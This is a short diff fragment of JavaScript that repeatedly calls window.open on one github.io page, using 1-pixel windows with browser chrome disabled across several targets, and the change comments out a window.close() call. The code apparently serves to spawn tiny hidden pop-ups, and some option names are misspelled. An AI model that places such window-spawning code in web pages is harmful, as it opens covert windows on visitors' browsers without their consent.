@@ -72,6 +72,5 @@ window.open('https://th3rdctrl.github.io/index.html','_parent','height=1,widht=1
 window.open('https://th3rdctrl.github.io/index.html','_blank','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
 window.open('https://th3rdctrl.github.io/index.html','_top','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
 window.open('https://th3rdctrl.github.io/index.html','_self','height=1,widht=1,fullscreen=no,menubar=no,resizeable=no,status=no,scrollbar=no,titlebar=no,top=1,left=1,location=no');
-window.close();
-
+// window.close();
 // localStrorage.clear()
